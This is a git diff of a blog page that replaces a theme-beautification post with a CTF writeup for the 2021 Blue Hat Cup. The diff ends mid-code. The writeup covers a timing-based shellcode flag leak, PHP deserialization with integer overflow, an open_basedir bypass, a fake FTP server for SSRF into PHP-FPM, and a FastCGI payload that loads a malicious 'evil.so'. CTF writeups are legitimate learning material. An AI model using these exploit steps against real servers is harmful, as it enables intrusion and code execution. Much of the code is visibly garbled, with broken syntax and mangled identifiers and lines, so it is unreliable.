@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Hexo+NexT(v7.72)博客主题美化，打造“超炫”网站（二）, Marmalade&#39;s Blog">
+    <meta name="keywords" content="第五届“蓝帽杯” 初赛WriteUp, Marmalade&#39;s Blog">
     <meta name="description" content="一个ctfer的成长之路">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Hexo+NexT(v7.72)博客主题美化，打造“超炫”网站（二） | Marmalade&#39;s Blog</title>
+    <title>第五届“蓝帽杯” 初赛WriteUp | Marmalade&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -376,12 +376,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://gitee.com/marmalade0/images/raw/master/www.marmalade.vip/background/3N_2OON@VASV_9~CI06R)CC.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Hexo+NexT(v7.72)博客主题美化，打造“超炫”网站（二）</h1>
+                    <h1 class="description center-align post-title">第五届“蓝帽杯” 初赛WriteUp</h1>
                 </div>
             </div>
         </div>
@@ -501,16 +501,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/next%E4%B8%BB%E9%A2%98/">
-                                <span class="chip bg-color">next主题</span>
-                            </a>
-                        
-                            <a href="/tags/next%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/">
-                                <span class="chip bg-color">next主题美化</span>
-                            </a>
-                        
-                            <a href="/tags/%E7%BD%91%E7%AB%99%E6%B7%BB%E5%8A%A0%E5%8A%9F%E8%83%BD/">
-                                <span class="chip bg-color">网站添加功能</span>
+                            <a href="/tags/%E8%93%9D%E5%B8%BD%E6%9D%AF/">
+                                <span class="chip bg-color">蓝帽杯</span>
                             </a>
                         
                     </div>
@@ -521,8 +513,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/hexo-github%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%8B%E4%B8%8E%E7%BE%8E%E5%8C%96/" class="post-category">
-                                hexo+github博客建立与美化
+                            <a href="/categories/writeup/" class="post-category">
+                                writeup
                             </a>
                         
                     </div>
@@ -534,28 +526,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-04-14
+                    2021-05-14
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-06-07
+                    2021-05-14
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    971
+                    3.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    19 分
                 </div>
                 
 
@@ -575,55 +567,659 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>先分享一点小经验</p>
-<h5 id="修改了模板，但是没有生效？"><a href="#修改了模板，但是没有生效？" class="headerlink" title="修改了模板，但是没有生效？"></a>修改了模板，但是没有生效？</h5><p>修改了模板以后不生效，建议先<strong>hexo clean</strong>，然后再hexo generate。只执行hexo generate，可能模板后者静态文件不会被替换。<br>知道晚了，以为设置错误，两天后hexo clean，然后奇迹出现了！！！</p>
-<h6 id="本地和网站不同步？hexo-clean"><a href="#本地和网站不同步？hexo-clean" class="headerlink" title="本地和网站不同步？hexo clean!"></a>本地和网站不同步？hexo clean!</h6><p>下面是接上一篇的更多网站美化功能</p>
-<a id="more"></a>
+                <h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="slient"><a href="#slient" class="headerlink" title="slient"></a>slient</h2><p>存在shellcode执行</p>
+<p>去年蓝帽决赛原题：附带解题链接</p>
+<p><a href="https://www.cnblogs.com/p201821440039/p/14219506.html" target="_blank" rel="noopener">https://www.cnblogs.com/p201821440039/p/14219506.html</a></p>
+<p>脚本如下：</p>
+<pre><code>from pwn import *
+elf=ELF('./chall')
+EXCV = context.binary = './chal'
+libc=('')
+#context.log_level = 'debug'
 
-<h3 id="8-在网站底部添加访问量"><a href="#8-在网站底部添加访问量" class="headerlink" title="(8)在网站底部添加访问量"></a>(8)在网站底部添加访问量</h3><p>进入<code>\themes\next\layout\ _partials\footer.swig</code>文件顶部第一行添加</p>
-<pre><code>&lt;script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"&gt;&lt;/script&gt;</code></pre><p>2.搜索</p>
-<pre><code>{% if theme.footer.powered.enable %}</code></pre><p>在这个位置上添加以下代码</p>
-<pre><code>&lt;div class="powered-by"&gt;
-&lt;i class="fa fa-user-md"&gt;&lt;/i&gt;&lt;span id="busuanzi_container_site_pv"&gt;总访问量&lt;span id="busuanzi_value_site_pv"&gt;&lt;/span&gt;次&lt;/span&gt;
-    &lt;span class="post-meta-divider"&gt;,&lt;/span&gt;
-    &lt;span id="busuanzi_container_site_uv"&gt;我的第&lt;span id="busuanzi_value_site_uv"&gt;&lt;/span&gt;位朋友&lt;/span&gt;
-    &lt;span class="post-meta-divider"&gt;|&lt;/span&gt;
-&lt;/div&gt;</code></pre><p>注：这里的id值可以选择两种</p>
-<pre><code># busuanzi_value_site_uv  表示用户连续点击n篇文章，只记录1次访客数# busuanzi_value_site_pv  表示用户连续点击n篇文章，记录+n次访问量
-# 这里对应的是2上的id值</code></pre><p>效果如下：<br>本地访问会出现人数爆棚现象，正常，部署到github上会恢复正常<br><img src="/images/beautify2/1.png" alt="bc3439ac113ed8ca432e2b3ec0f6d5ca.png"></p>
-<h3 id="9-添加打赏功能"><a href="#9-添加打赏功能" class="headerlink" title="(9)添加打赏功能"></a>(9)添加打赏功能</h3><p>在主题配置文件中搜索Reward，改为如下形式<br><img src="/images/beautify2/2.png" alt="e3897be70d0db4287935e8a4489568de.png"><br>效果：<br><img src="/images/beautify2/3.png" alt="5f98934f4d64ccd9e1159d9ee4bbcc77.png"></p>
-<blockquote>
-<p><a href="https://segmentfault.com/a/1190000016527304?utm_source=tag-newest" target="_blank" rel="noopener">参考文章</a></p>
-</blockquote>
-<h3 id="10-添加阅读统计及评论"><a href="#10-添加阅读统计及评论" class="headerlink" title="(10)添加阅读统计及评论"></a>(10)添加阅读统计及评论</h3><p><a href="https://segmentfault.com/a/1190000016565949" target="_blank" rel="noopener">参考文章</a></p>
-<h5 id="添加阅读次数统计"><a href="#添加阅读次数统计" class="headerlink" title="添加阅读次数统计"></a>添加阅读次数统计</h5><p>需要用到leancloud网站，<br>1.注册一个账号<br>2.创建应用(开发版)<br>3.进入设置页面<br>4.应用key<br>将App ID、App Key 配置到next/_config.yml中leancloud_visitors</p>
-<pre><code>leancloud_visitors:
- enable: true 设置为true 默认为false
- app_id:  #你的App ID，注意冒号后面空格
- app_key:  #你的App Key，注意冒号后面空格
- Dependencies:  https://github.com/theme-next/hexo-leancloud-counter-security #设置依赖
- security: true #如果您不关心lc计数器中的安全性并且只想直接使用它（没有hexo-leancloud-counter-security插件），请将`security`设置为`false`。  betterPerformance: true #更好的性能</code></pre><p>5.在leancloud存储的位置创建Class,必须命名为Counter<br><img src="/images/beautify2/4.png" alt="a1021618af30065d9ef1cf3b5eb0ab48.png"><br>6.查看后台统计数据<br><img src="/images/beautify2/5.png" alt="542d40c0448b9bcbf050c9b5bd509508.png"></p>
-<h5 id="添加评论"><a href="#添加评论" class="headerlink" title="添加评论"></a>添加评论</h5><p>选择的是Valine系统<br>进入leancloud<br>1.创建应用<br><img src="/images/beautify2/6.png" alt="f3cfd885cc0e436d58d6ac13ae2c7cef.png"><br>2.进入设置页面<br><img src="/images/beautify2/7.png" alt="4749312c24ca3633a258d13d15459ae9.png"><br>3.应用key<br><img src="/images/beautify2/8.png" alt="986351dd5c71bed5c9fefb54abf8737f.png"><br>4.在<code>next/_config.yml</code>进行一下配置</p>
-<pre><code>valine:
-  enable: true # 设置为true，默认为false
-  appid:  # 将应用key的App ID设置在这里
-  appkey: # 将应用key的App Key设置在这里
-  notify: true# 邮箱通知 , https://github.com/xCss/Valine/wiki，默认为false
-  verify: true# 验证码 默认为false 
-  placeholder: Just go go ^_^ # 初始化评论显示，根据自己修改，这里默认， 
-  avatar: wavatar # 头像风格，默认为mm，可进入网址：https://valine.js.org/visitor.html查看头像设置，这里有许多头像风格，进行设置  
-  guest_info: nick,mail,link # 自定义评论标题  
-  pageSize: 10 # 分页大小，10页就自动分页  
-  visitor: true # 是否允许游客评论 ，进入官网查看设置：https://valine.js.org/visitor.html</code></pre><p>完成<br>6.在后台查看评论数据<br>在valine后台，存储位置中的数据里面创建Class，名称必须为命名为Comment<br><img src="/images/beautify2/9.png" alt="dba10b9c2f501621d0243fa4c0bedbbe.png"></p>
-<blockquote>
-<p>注：选择valine评论系统是因为支持国内网络，不需要连接外网（翻墙）就可以进行显示评论系统，而且很好管理，页面简单。</p>
-</blockquote>
-<h3 id="11-read-more以及压缩文章"><a href="#11-read-more以及压缩文章" class="headerlink" title="(11)read more以及压缩文章"></a>(11)read more以及压缩文章</h3><pre><code>&lt;!-- more --&gt;</code></pre><p>指令加到文章哪个部分，就从哪部分向下不显示</p>
-<h3 id="12-网页底部的动态桃心图像"><a href="#12-网页底部的动态桃心图像" class="headerlink" title="(12)网页底部的动态桃心图像"></a>(12)网页底部的动态桃心图像</h3><p><strong>修改主题配置文件:</strong></p>
-<pre><code>icon:
-    name: heart      #如果name的值为heart表示引用fontawesome网站上的心形图标
-    animated: true     #如果想用动态图标应该将animated的值设为true
-    color: "#ff0000"     #图标的色--用16进制数  </code></pre><p>效果如下：<br><img src="/images/beautify2/10.png" alt="c3704c2babdf19d93e17ddb1f04597c8.png"><br>（心还在跳）</p>
+def pwn, idx, c):
+      # open
+    shellcode = "push 0x10032aaa; pop rdrdi; shr edi, 12; xor esi, esi; push 2; pop rax; syscall;"
+
+    # re open, rax =&gt; 4
+    shellcode += "push 2; pop rax; syscall;"
+
+    # read(rax, 0x10040, 0x50)
+    shellcode += "mov rdi, rax; xor eax, eax; push 0x50; pop rdx; push 0x10040aaa; pop rsi; shr esi, 12; syscall;"
+
+    # cmp and jz
+    if idx == 0:
+        shellcode += "cmp byte ptr[rsi+{0}], {1}; jz $-3; ret".format(idx, c)
+    else:
+        shellcode += "cmp byte ptr[rsi+{0}], {1}; jz $-4; ret".format(idx, c)
+
+    shellcode = asm(shellcode)
+
+    p.sendafter("xecution-box.\n", shellcode.ljust(0x40-14, b'a') + b'/home/pwn/flag')
+
+idx = 0
+var_list = []
+while(1):
+    for c in range(32, 127):
+        p = remote("8.140.177.7",40334)#nc 8.131.246.36 40334    
+        pwn(p, idx, c)
+        start = time.time()
+        try:
+            p.recv(timeout=2)
+        excep:
+            pass
+        end = time.time()
+        p.close()
+         if end-start &gt; 1.5:
+            var_list.append(c)
+            print("".join([chr(i) for i in var_list]))
+            break
+    else:
+        print("".join([chr(i) for i in var_list]))
+        break
+    idx = idx + 1
+
+print("".join([chr(i) for i in var_list]))</code></pre><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Ball-sigin"><a href="#Ball-sigin" class="headerlink" title="Ball_sigin"></a>Ball_sigin</h2><p>玩出来的</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514093434.jpg" alt="web1"></p>
+<h2 id="one-Pointer-php"><a href="#one-Pointer-php" class="headerlink" title="one_Pointer_php"></a>one_Pointer_php</h2><p>感谢buuctf，蓝帽复现环境提供的太及时了，太强了</p>
+<p>参考链接：</p>
+<p><a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/#i-6" target="_blank" rel="noopener">https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/#i-6</a></p>
+<p><a href="https://rmb122.com/2020/12/30/hxp-CTF-resonator-Writeup-SSRF-via-file-put-contents/" target="_blank" rel="noopener">https://rmb122.com/2020/12/30/hxp-CTF-resonator-Writeup-SSRF-via-file-put-contents/</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/343918026" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/343918026</a></p>
+<p>源码就俩文件：</p>
+<pre><code>add_api.php
+&lt;?php
+include "user.php";
+if($user=unserialize($_COOKIE["data"])){
+    $count[++$user-&gt;count]=1;
+    if($count[]=1){
+        $user-&gt;count+=1;
+        setcookie("data",seialize($user));
+    }else{
+        eval($_GET["backdoor"]);
+    }
+}else{
+    $uuser=new User;
+    $user-&gt;count=1;
+    setcookie("data",serialize($user));
+}
+?&gt;
+user.php
+&lt;?php
+class User{
+    public $count;
+}
+?&gt;</code></pre><p>第一部分整型溢出略过</p>
+<pre><code>&lt;?php
+class User{
+    public $count=9223372036854775806;
+}
+$a = new User;
+
+echo urlencode(serialize($a));
+//O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D
+?&gt;</code></pre><p>第二部分可以通过eval执行代码，发现禁用了好多函数和类，而且做了open_basedir</p>
+<pre><code>disable_functions = stream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive
+
+; This directive allows you to disable certain classes.
+; http://php.net/disable-classes
+
+disable_classes = Exception,SplDoublyLinkedList,Error,ErrorException,ArgumentCountError,ArithmeticError,AssertionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException   Exception,SplDoublyLinkedLit,Error,ErrorException,ArgumentCountError,ArithmeticError,AsserttionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException</code></pre><p>绕过open_basedir:</p>
+<pre><code>mkdir('img');chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('/'));</code></pre><p>可以读取到php.ini啥的，但是flag读取不了，查看权限显示为<code>0400</code>，绝对是要getshell后提权</p>
+<p>phpinfo处显示有一个easy_bypass，这个应该是预期解，web pwn</p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094637.png" alt="image-20210502153907457"></p>
+<p>通过phpinfo还可以发现环境是<code>FPM/FastCGI</code>，绕过open_basedir读php.ini可以看到端口为<code>9001</code></p>
+<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094639.png" alt="image-20210502154013951"></p>
+<p>考虑到可以通过攻击<code>FPM</code>来bypass</p>
+<p>因为禁用了许多函数和类，普通的ssrf无法使用，但是ftp协议未被禁用</p>
+<p>这篇文章讲的挺清楚：</p>
+<p><a href="https://rmb122.com/2020/12/30/hxp-CTF-resonator-Writeup-SSRF-via-file-put-contents/" target="_blank" rel="noopener">https://rmb122.com/2020/12/30/hxp-CTF-resonator-Writeup-SSRF-via-file-put-contents/</a></p>
+<p>ftp 协议相对比较复杂, 其中存在一个特性, 相信大家都听说过, 就是 ftp 的数据端口和指令端口是分开的, 我们平时所说的 21 号端口其实是 ftp 的指令端口, 用于发送指令, 比如认证用户和指定读取的文件. 但是如果是传输文件的内容, ftp 实际上会重新打开一个链接, 同时还分为两种模式, 被动模式和主动模式.</p>
+<p>这里 wikipedia 讲的比较清楚, 我直接复制一段过来</p>
+<pre><code>FTP有两种使用模式：主动和被动。主动模式要求客户端和服务器端同时打开并且监听一个端口以创建连接。在这种情况下，客户端由于安装了防火墙会产生一些问题。所以，创立了被动模式。被动模式只要求服务器端产生一个监听相应端口的进程，这样就可以绕过客户端安装了防火墙的问题。</code></pre><p>注意 <code>被动模式只要求服务器端产生一个监听相应端口的进程</code>, 这里有非常重要的一点, 这个被动模式的端口是服务器指定的, 而且还有一点是很多地方没有提到的, 实际上除了端口, 服务器的地址也是可以被指定的. 由于 ftp 和 http 类似, 协议内容全是纯文本, 我们可以很清晰的看到它是如何指定地址和端口的</p>
+<pre><code>227 Entering Passive Mode(192,168,9,2,4,8)</code></pre><p>227 和 Entering Passive Mode 类似 HTTP 的状态码和状态短语, 而 (192,168,9,2,4,8) 代表让客户端连接 192.168.9.2 的 4 * 256 + 8 = 1032 端口.<br>这样这个如何利用就很明显了, file_put_contents 在使用 ftp 协议时, 会将 data 的内容上传到 ftp 服务器, 由于上面说的 pasv 模式下, 服务器的地址和端口是可控, 我们可以将地址和端口指到 127.0.0.1:9000. 同时由于 ftp 的特性, 不会有任何的多余内容, 类似 gopher 协议, 会将 data 原封不动的发给 127.0.0.1:9000, 完美符合攻击 fastcgi 的要求.</p>
+<h3 id="伪造FTP服务器"><a href="#伪造FTP服务器" class="headerlink" title="伪造FTP服务器"></a>伪造FTP服务器</h3><pre><code>import socket
+
+host = '0.0.0.0'
+port = 2334
+sk = socket.socket()
+sk.bind((host, port))
+sk.listen(5)
+
+conn, address = sk.accept()
+conn.send("200 \n")
+print '200'
+print conn.recv(20)
+
+conn.send("200 \n")
+print '200'
+print conn.recv(20)
+
+conn.send("200 \n")
+print '200'
+print conn.recv(20)
+
+conn.send("300 \n")
+print '300'
+print conn.recv(20)
+
+conn.send("200 \n")
+print '200'
+print conn.recv(20)
+print "ck"
+nn.send("22 127,0,0,1,0,9001\n")
+print '200'
+print conn.recv(20)0)
+
+conn.sendd("150 \n")
+print '150'
+print conn.recv(20)
+conn.close()
+exit()</code></pre><h3 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h3><pre><code>&lt;?php
+&lt;?php
+/**
+ * Note : Code is released under the GNU LGPL
+ *
+ * Please do not change the header of this file
+ *
+ * This library is free software; you can redistribute it and/or modify it under the terms of the GNU
+ * Lesser General Public License as published by the Free Software Foundation; either version 2 of
+ * the License, or (at your option) any later version.
+ *
+ * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
+ * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ *
+ * See the GNU Lesser General Public License for more details.
+ */
+/**
+ * Handles communication with a FastCGI application
+ *
+ * @author      Pierrick Charron &lt;pierrick@webstart.fr&gt;
+ * @version     1.0
+ */
+class FCGIClient
+{
+    const VERSION_1            = 1;
+    const BEGIN_REQUEST        = 1;
+    const ABORT_REQUEST        = 2;
+    const END_REQUEST          = 3;
+    const PARAMS               = 4;
+    const STDIN                = 5;
+    const STDOUT               = 6;
+    const STDERR               = 7;
+    const DATA                 = 8;
+    const GET_VALUES           = 9;
+    const GET_VALUES_RESULT    = 10;
+    const UNKNOWN_TYPE         = 11;
+    const MAXTYPE              = self::UNKNOWN_TYPE;
+    const RESPONDER            = 1;
+    const AUTHORIZER           = 2;
+    const FILTER               = 3;
+    const REQUEST_COMPLETE     = 0;
+    const CANT_MPX_CONN        = 1;
+    const OVERLOADED           = 2;
+    const UNKNOWN_ROLE         = 3;
+    const MAX_CONNS            = 'MAX_CONNS';
+    const MAX_REQS             = 'MAX_REQS';
+    const MPXS_CONNS           = 'MPXS_CONNS';
+    const HEADER_LEN           = 8;
+    /**
+     * Socket
+     * @var Resource
+     */
+    private $_sock = null;
+    /**
+     * Host
+     * @var String
+     */
+    private $_host = null;
+    /**
+     * Port
+     * @var Integer
+     */
+    private $_port = null;
+    /**
+     * Keep Alive
+     * @var Boolean
+     */
+    private $_keepAlive = false;
+    /**
+     * Constructor
+     *
+     * @param String $host Host of the FastCGI application
+     * @param Integer $port Port of the FastCGI application
+     */
+    public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
+    {
+        $this-&gt;_host = $host;
+        $this-&gt;_port = $port;
+    }
+    /**
+     * Define whether or not the FastCGI application should keep the connection
+     * alive at the end of a request
+     *
+     * @param Boolean $b true if the connection should stay alive, false otherwise
+     */
+    public function setKeepAlive($b)
+    {
+        $this-&gt;_keepAlive = (boolean)$b;
+        if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) {
+            fclose($this-&gt;_sock);
+        }
+    }
+    /**
+     * Get the keep alive status
+     *
+     * @return Boolean true if the connection should stay alive, false otherwise
+     */
+    public function getKeepAlive()
+    {
+        return $this-&gt;_keepAlive;
+    }
+    /**
+     * Create a connection to the FastCGI application
+     */
+    private function connect()
+    {
+        if (!$this-&gt;_sock) {
+            //$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);
+            $this-&gt;_sock = stream_socket_client($this-&gt;_host, $errno, $errstr, 5);
+            if (!$this-&gt;_sock) {
+                throw new Exception('Unable to connect to FastCGI application');
+            }
+        }
+    }
+    /**
+     * Build a FastCGI packet
+     *
+     * @param Integer $type Type of the packet
+     * @param String $content Content of the packet
+     * @param Integer $requestId RequestId
+     */
+    private function buildPacket($type, $content, $requestId = 1)
+    {
+        $clen = strlen($content);
+        rturn chr(self::VERSION_1)         /* version */
+            . chhr($type)                    /* type */
+            . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */
+            . chr$requestId &amp; 0xFF)        /* requestIdB0 */
+            . chr(($$clen &gt;&gt; 8 ) &amp; 0xFF)     /* contentLengthB1 */
+            . chr($clen &amp; 0xFF)             /* contentLengthB0 */
+            . chr(0)                        /* paddingLength */
+            . chr(0)                        /* reserved */
+            . $content;                     /* content */
+    }
+    /**
+     * Build an FastCGI Name value pair
+     *
+     * @param String $name Name
+     * @param String $value Value
+     * @return String FastCGI Name value pair
+     */
+    private function buildNvpair($name, $value)
+    {
+        $nlen = strlen($name);
+        $vlen = strlen($value);
+        if ($nlen &lt; 128) {
+            /* nameLengthB0 */
+            $nvpair = chr($nlen);
+        } else {
+            /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */
+            $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF);
+        }
+        if ($vlen &lt; 128) {
+            /* valueLengthB0 */
+            $nvpair .= chr($vlen);
+        } else {
+            /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */
+            $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF);
+        }
+        /* nameData &amp; valueData */
+        return $nvpair . $name . $value;
+    }
+    /**
+     * Read a set of FastCGI Name value pairs
+     *
+     * @param String $data Data containing the set of FastCGI NVPair
+     * @return array of NVPair
+     */
+    private function readNvpair($data, $length = null)
+    {
+        $array = array();
+        if ($length === null) {
+            $length = strlen($data);
+        }
+        $p = 0;
+        while ($p != $length) {
+            $nlen = ord($data{$p++});
+            if ($nlen &gt;= 128) {
+                $nlen = ($nlen &amp; 0x7F &lt;&lt; 24);
+                $nlen |= (ord($data{$p++}) &lt;&lt; 16);
+                $nlen |= (ord($data{$p++}) &lt;&lt; 8);
+                $nlen |= (ord($data{$p++}));
+            }
+            $vlen = ord($data{$p++});
+            if ($vlen &gt;= 128) {
+                $vlen = ($nlen &amp; 0x7F &lt;&lt; 24);
+                $vlen |= (ord($data{$p++}) &lt;&lt; 16);
+                $vlen |= (ord($data{$p++}) &lt;&lt; 8);
+                $vlen |= (ord($data{$p++}));
+            }
+            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
+            $p += ($nlen + $vlen);
+        }
+        return $array;
+    }
+    /**
+     * Decode a FastCGI Packet
+     *
+     * @param String $data String containing all the packet
+     * @return array
+     */
+    private function decodePacketHeader($data)
+    {
+        $ret = array();
+        $ret['version']       = ord($data{0});
+        $ret['type']          = ord($data{1});
+        $ret['requestId']     = (ord($data{2}) &lt;&lt; 8) + ord($data{3});
+        $ret['contentLength'] = (ord($data{4}) &lt;&lt; 8) + ord($data{5});
+        $ret['paddingLength'] = ord($data{6});
+        $ret['reserved']      = ord($data{7});
+        return $ret;
+    }
+    /**
+     * Read a FastCGI Packet
+     *
+     * @return array
+     */
+    private function readPacket()
+    {
+        if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) {
+            $resp = $this-&gt;decodePacketHeader($packet);
+            $resp['content'] = '';
+            if ($resp['contentLength']) {
+                $len  = $resp['contentLength'];
+                while ($len &amp;&amp; $buf=fread($thresp['contentLength']) {
+                $len  = $resp['contentL                  $resp['content'] .= $buf;
+                }
+            }
+            if ($resp['paddingLength']) {
+                $buf=fread($this-&gt;_sock, $resp['paddingLength']);
+            }
+            return $resp;
+        } else {
+            return false;
+        }
+    }
+    /**
+     * Get Informations on the FastCGI application
+     *
+     * @param array $requestedInfo information to retrieve
+     * @return array
+     */
+    public function getValues(array $requestedInfo)
+    {
+        $this-&gt;connect();
+        $request = '';
+        foreach ($requestedInfo as $info) {
+            $request .= $this-&gt;buildNvpair($info, '');
+        }
+        fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0));
+        $resp = $this-&gt;readPacket();
+        if ($resp['type'] == self::GET_VALUES_RESULT) {
+            return $this-&gt;readNvpair($resp['content'], $resp['length']);
+        } else {
+            throw new Exception('Unexpected response typ, expecting GET_VALUES_RESULT');
+        }
+    }
+    /**
+     *  Execute a request to the FastCGI application
+     *
+     * @param array $params Array of parameters
+     * @param String $stdin Content
+     * @return String
+     */
+    public function request(array $params, $stdin)
+    {
+        $response = '';
+//        $this-&gt;connect();
+        $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0 . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_reppeat(chr(0), 5));
+        $paramsRequest = '';
+        foreach ($params as $key =&gt; $value) {
+            $paramsRequest .= $this-&gt;buildNvpair($key, $value);
+        }
+        if ($paramsRequest) {
+            $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest);
+        }
+        $request .= $this-&gt;buildPacket(self::PARAMS, '');
+        if ($stdin) {
+            $request .= $this-&gt;buildPacket(self::STDIN, $stdin);
+        }
+        $request .= $this-&gt;buildPacket(self::STDIN, '');
+        // 输出构造好的请求
+        return (urlencode($request));
+//        fwrite($this-&gt;_sock, $request);
+//        do {
+//            $resp = $this-&gt;readPacket();
+//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
+//                $response .= $resp['content'];
+//            }
+//        } while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);
+//        var_dump($resp);
+//        if (!is_array($resp)) {
+//            throw new Exception('Bad request');
+//        }
+//        switch (ord($resp['content']{4})) {
+//            case self::CANT_MPX_CONN:
+//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
+//                break;
+//            case self::OVERLOADED:
+//                throw new Exception('New request rejected; too busy [OVERLOADED]');
+//                break;
+//            case self::UNKNOWN_ROLE:
+//                throw new Exception('Role value not known [UNKNOWN_ROLE]');
+//                break;
+//            case self::REQUEST_COMPLETE::/                return $response;
+//        }
+    }
+}
+// php5
+
+// ssrf生成payload的话，这里不用管
+$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
+$SCRIPT_FILENAME = '/var/www/html/user.php';
+$SCRIPT_NAME = '/'.basename($SCRIPT_FILENAME);
+// GET参数
+$REQUEST_URI = $SCRIPT_NAME;
+// POST参数
+$content = '';
+// 设置php_value利用php://input执行代码
+// $PHP_ADMIN_VALUE = "allow_url_include=On\nopen_basedir=/\nauto_prepend_file=php://input";
+// 设置php_value加载恶意so文件，把so文件上传到/var/www/html中或其他目录
+$PHP_ADMIN_VALUE = "extension_dir = /var/www/html\nextension = evil.so\n";
+$res = $client-&gt;request(
+                      array(
+                            'GATEWAY_INTERFACE' =&gt; 'FastCGI/1.0',
+                            'REQUEST_METHOD' =&gt; 'POST',
+                            'SCRIPT_FILENAME' =&gt; $SCRIPT_FILENAME,
+                            'SCRIPT_NAME' =&gt; $SCRIPT_NAME,
+                            'REQUEST_URI' =&gt; $REQUEST_URI,
+                            'PHP_ADMIN_VALUE'   =&gt; $PHP_ADMIN_VALUE,
+                            'SERVER_SOFTWARE' =&gt; 'php/fastcgiclient',
+                            'REMOTE_ADDR' =&gt; '127.0.0.1',
+                            'REMOTE_PORT' =&gt; '9985',
